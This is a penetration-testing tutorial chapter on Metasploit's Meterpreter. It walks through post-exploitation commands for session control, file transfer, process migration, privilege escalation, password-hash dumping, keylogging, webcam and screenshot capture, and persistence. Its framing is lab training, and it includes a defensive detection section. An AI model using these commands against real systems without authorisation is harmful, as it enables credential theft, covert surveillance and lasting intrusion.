# Chapter 7: Meterpreter Deep Dive

## 7.1 Overview

Meterpreter is one of the most powerful components of the Metasploit Framework. It provides an advanced, interactive payload that runs entirely in memory on the target system.

Unlike a basic shell, Meterpreter offers a rich set of built-in commands for system control, reconnaissance, and post-exploitation tasks.

This chapter focuses on understanding and effectively using Meterpreter at a deeper level.

---

## 7.2 What Makes Meterpreter Special

Meterpreter is designed to be:

- **In-memory** (no disk footprint in typical scenarios)
- **Extensible** (supports additional modules)
- **Encrypted communication** (between attacker and target)
- **Interactive** (real-time control)

It allows penetration testers to simulate advanced attacker behavior in controlled environments.

---

## 7.3 Meterpreter Session Basics

Once a Meterpreter session is established, you can interact with it using:

```bash
sessions -i <id>
````

Example:

```bash
sessions -i 1
```

This opens an interactive Meterpreter prompt.

---

## 7.4 Core Meterpreter Commands

These are essential commands used in nearly every session.

### System Information

```bash id="m7s1a1"
sysinfo
```

Displays operating system, architecture, and system name.

---

### Current User

```bash id="m7s1a2"
getuid
```

Shows the user context under which Meterpreter is running.

---

### Process Listing

```bash id="m7s1a3"
ps
```

Displays running processes on the target system.

---

### Directory Navigation

```bash id="m7s1a4"
pwd
ls
cd <directory>
```

Used to navigate and explore the file system.

---

## 7.5 File System Operations

Meterpreter allows full file manipulation capabilities.

### Download file from target

```bash id="m7s2a1"
download secret.txt
```

### Upload file to target

```bash id="m7s2a2"
upload payload.exe
```

### Search files

```bash id="m7s2a3"
search -f *.txt
```

---

## 7.6 Process Migration

Process migration allows Meterpreter to move into a more stable or trusted process.

### Step 1: List processes

```bash id="m7s3a1"
ps
```

### Step 2: Migrate

```bash id="m7s3a2"
migrate <pid>
```

Benefits:

* Maintains session stability
* Can blend into legitimate system processes

---

## 7.7 Network Information

Meterpreter provides detailed network insight.

### Show network interfaces

```bash id="m7s4a1"
ipconfig
```

### Show routing table

```bash id="m7s4a2"
route
```

### Check active connections

```bash id="m7s4a3"
netstat
```

---

## 7.8 Privilege Escalation Support

Meterpreter integrates with Metasploit post modules for privilege escalation.

### Check current privileges

```bash id="m7s5a1"
getuid
```

### Attempt escalation modules

```bash id="m7s5a2"
use post/multi/escalate
```

Privilege escalation success depends on system vulnerabilities and misconfigurations.

---

## 7.9 Credential Access

Meterpreter can extract credentials depending on system type and permissions.

### Dump password hashes (Windows systems)

```bash id="m7s6a1"
hashdump
```

### Keylogging (if supported)

```bash id="m7s6a2"
keyscan_start
keyscan_dump
keyscan_stop
```

These features are commonly used in controlled lab environments for learning purposes.

---

## 7.10 Screenshot and Webcam Access

Meterpreter can capture visual information from a system.

### Take screenshot

```bash id="m7s7a1"
screenshot
```

### Webcam snapshot (if available)

```bash id="m7s7a2"
webcam_snap
```

> These features demonstrate the level of access possible after compromise.

---

## 7.11 Persistence Techniques

Persistence ensures continued access to a system.

Example persistence module:

```bash id="m7s8a1"
run persistence -h
```

Common persistence methods include:

* Startup registry modification
* Scheduled tasks
* Service installation

---

## 7.12 Escaping Detection (Conceptual)

Meterpreter sessions may attempt to avoid detection through:

* Encrypted communication
* In-memory execution
* Process migration

From a defensive perspective, these behaviors are often monitored by EDR systems.

---

## 7.13 Scripting and Automation

Meterpreter supports automation through scripts and commands.

Example batch execution:

```bash id="m7s9a1"
run post/windows/gather/enum_logged_on_users
```

Automation helps streamline repetitive penetration testing tasks.

---

## 7.14 Session Management

You may manage multiple sessions simultaneously.

### List sessions:

```bash id="m7s10a1"
sessions
```

### Kill session:

```bash id="m7s10a2"
sessions -k 1
```

---

## 7.15 Defensive Perspective

Defenders monitor Meterpreter-like behavior by detecting:

* Suspicious process injection
* Encrypted reverse connections
* Unauthorized credential access
* Abnormal system calls

Understanding Meterpreter helps defenders build better detection strategies.

---

## 7.16 Best Practices

* Always use Meterpreter in isolated lab environments
* Document all session actions during training
* Understand both offensive and defensive implications
* Avoid destructive testing outside labs

---

## 7.17 What’s Next?

In the next chapter, we will cover:

* Real-world attack chains
* Combining reconnaissance, exploitation, and post-exploitation
* Simulated penetration testing scenarios

---

## Summary

Meterpreter is a powerful interactive payload that extends Metasploit’s capabilities far beyond simple command execution. Mastering it is essential for advanced penetration testing workflows.

